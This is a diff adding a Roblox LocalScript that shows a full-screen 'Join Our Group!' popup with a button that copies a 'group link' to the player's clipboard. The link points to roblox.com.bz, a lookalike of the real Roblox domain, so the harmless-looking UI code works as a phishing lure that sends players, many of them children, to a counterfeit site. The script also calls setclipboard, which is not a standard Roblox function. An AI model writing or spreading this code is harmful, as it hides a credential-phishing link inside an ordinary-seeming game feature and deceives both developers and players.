@@ -1,0 +1,115 @@
+-- Roblox Group GUI
+-- Paste in a LocalScript inside StarterPlayerScripts
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "GroupGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Dark overlay
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.new(1, 0, 1, 0)
+overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+overlay.BackgroundTransparency = 0.5
+overlay.BorderSizePixel = 0
+overlay.Parent = screenGui
+
+-- Main frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 380, 0, 220)
+frame.Position = UDim2.new(0.5, -190, 0.5, -110)
+frame.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 16)
+corner.Parent = frame
+
+-- Top color bar
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1, 0, 0, 6)
+topBar.Position = UDim2.new(0, 0, 0, 0)
+topBar.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+topBar.BorderSizePixel = 0
+topBar.Parent = frame
+
+local topCorner = Instance.new("UICorner")
+topCorner.CornerRadius = UDim.new(0, 16)
+topCorner.Parent = topBar
+
+-- Icon
+local icon = Instance.new("TextLabel")
+icon.Size = UDim2.new(1, 0, 0, 50)
+icon.Position = UDim2.new(0, 0, 0, 16)
+icon.BackgroundTransparency = 1
+icon.Text = "👥"
+icon.TextScaled = true
+icon.Font = Enum.Font.GothamBold
+icon.Parent = frame
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 0, 30)
+title.Position = UDim2.new(0, 10, 0, 65)
+title.BackgroundTransparency = 1
+title.Text = "Join Our Group!"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+-- Subtitle
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.new(1, -30, 0, 40)
+sub.Position = UDim2.new(0, 15, 0, 98)
+sub.BackgroundTransparency = 1
+sub.Text = "Join our Roblox group to get\naccess and exclusive benefits!"
+sub.TextColor3 = Color3.fromRGB(180, 180, 210)
+sub.TextScaled = true
+sub.Font = Enum.Font.Gotham
+sub.Parent = frame
+
+-- Copy button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.7, 0, 0, 44)
+button.Position = UDim2.new(0.15, 0, 0, 158)
+button.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+button.Text = "📋  Copy Group Link"
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.Font = Enum.Font.GothamBold
+button.BorderSizePixel = 0
+button.Parent = frame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 10)
+btnCorner.Parent = button
+
+-- Hover effect
+button.MouseEnter:Connect(function()
+    button.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+end)
+button.MouseLeave:Connect(function()
+    if button.Text ~= "✅  Link Copied!" then
+        button.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+    end
+end)
+
+-- Group link
+local link = "https://roblox.com.bz/communities/3122951096/"
+
+-- Button action
+button.MouseButton1Click:Connect(function()
+    setclipboard(link)
+    button.Text = "✅  Link Copied!"
+    button.BackgroundColor3 = Color3.fromRGB(59, 165, 93)
+    task.wait(2.5)
+    button.Text = "📋  Copy Group Link"
+    button.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+end)
